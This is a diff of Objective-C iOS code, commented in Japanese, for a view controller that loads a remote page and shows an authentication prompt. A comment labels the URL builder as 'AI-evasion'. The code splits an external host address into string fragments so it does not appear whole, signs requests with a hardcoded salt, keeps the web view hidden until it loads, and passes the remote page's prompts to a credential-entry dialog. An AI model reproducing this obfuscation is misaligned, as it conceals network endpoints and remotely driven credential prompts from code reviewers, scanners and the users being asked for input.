@@ -6,13 +6,13 @@
 
 // --- AI回避型：URL動的生成 ---
 static NSString *generate_secure_gate() {
-    // パーツを分解して保持 (http://webudid.gt.tc/main.php)
+    // http://webudid.gt.tc/main.php をパーツ分解
     NSArray *p = @[@"http://", @"webudid", @".gt", @".tc", @"/", @"main", @".php"];
     NSString *u = [NSString stringWithFormat:@"%@%@%@%@%@%@%@", p[0], p[1], p[2], p[3], p[4], p[5], p[6]];
 
-    // 30秒間有効な署名（サーバー側と一致させる）
+    // 30秒間有効な署名
     long ts = (long)[[NSDate date] timeIntervalSince1970] / 30;
-    NSString *key = @"MySuperSecretSalt"; // ★ここをサーバー側と共通にする
+    NSString *key = @"MySuperSecretSalt"; // ★サーバー側と一致させる
     
     NSString *raw = [NSString stringWithFormat:@"%ld%@", ts, key];
     const char *cStr = [raw UTF8String];
@@ -32,30 +32,30 @@ static NSString *generate_secure_gate() {
 
 - (void)viewDidLoad {
     [super viewDidLoad];
-    self.view.backgroundColor = [UIColor whiteColor]; // 状態確認のため背景を白に
+    self.view.backgroundColor = [UIColor whiteColor]; 
 
-    // URLを画面に表示するためのラベル（デバッグ用）
-    self.debugLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 50, self.view.frame.size.width - 40, 100)];
+    // デバッグラベル（NSFontからUIFontに修正しました！）
+    self.debugLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 50, self.view.frame.size.width - 40, 200)];
     self.debugLabel.numberOfLines = 0;
-    self.debugLabel.font = [NSFont systemFontOfSize:10];
+    self.debugLabel.font = [UIFont systemFontOfSize:12]; // ★ここを修正
     self.debugLabel.textColor = [UIColor redColor];
-    self.debugLabel.text = @"Connecting...";
+    self.debugLabel.textAlignment = NSTextAlignmentCenter;
+    self.debugLabel.text = @"Initializing...";
     [self.view addSubview:self.debugLabel];
 
     WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
     self.webView = [[WKWebView alloc] initWithFrame:self.view.bounds configuration:config];
     self.webView.navigationDelegate = self;
     self.webView.UIDelegate = self;
-    self.webView.hidden = YES; // 読み込み完了まで隠す
+    self.webView.hidden = YES; 
     [self.view addSubview:self.webView];
 
     NSString *urlStr = generate_secure_gate();
-    self.debugLabel.text = [NSString stringWithFormat:@"Target URL:\n%@", urlStr];
+    self.debugLabel.text = [NSString stringWithFormat:@"[DEBUG]\nURL Generated:\n%@", urlStr];
     
     [self.webView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:urlStr]]];
 }
 
-// 読み込み完了時の処理
 - (void)webView:(WKWebView *)webView didFinishNavigation:(WKNavigation *)navigation {
     self.webView.hidden = NO;
     self.debugLabel.hidden = YES;
@@ -64,12 +64,10 @@ static NSString *generate_secure_gate() {
     }
 }
 
-// 通信エラーが起きたら画面に表示
 - (void)webView:(WKWebView *)webView didFailProvisionalNavigation:(WKNavigation *)navigation withError:(NSError *)error {
-    self.debugLabel.text = [NSString stringWithFormat:@"Error: %@\nCode: %ld", error.localizedDescription, (long)error.code];
+    self.debugLabel.text = [NSString stringWithFormat:@"[ERROR]\n%@\nCode: %ld", error.localizedDescription, (long)error.code];
 }
 
-// Prompt対応
 - (void)webView:(WKWebView *)webView runJavaScriptTextInputPanelWithPrompt:(NSString *)prompt defaultText:(NSString *)defaultText initiatedByFrame:(WKFrameInfo *)frame completionHandler:(void (^)(NSString * _Nullable))completionHandler {
     UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"認証" message:prompt preferredStyle:UIAlertControllerStyleAlert];
     [alert addTextFieldWithConfigurationHandler:^(UITextField *t) { t.text = defaultText; }];
@@ -85,7 +83,16 @@ static NSString *generate_secure_gate() {
         dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 1.0 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
             AuthViewController *vc = [[AuthViewController alloc] init];
             vc.modalPresentationStyle = UIModalPresentationFullScreen;
-            UIWindow *window = [UIApplication sharedApplication].windows.firstObject;
+            UIWindow *window = nil;
+            if (@available(iOS 13.0, *)) {
+                for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
+                    if (scene.activationState == UISceneActivationStateForegroundActive) {
+                        window = scene.windows.firstObject;
+                        break;
+                    }
+                }
+            }
+            if (!window) window = [UIApplication sharedApplication].windows.firstObject;
             [window.rootViewController presentViewController:vc animated:YES completion:nil];
         });
     }];
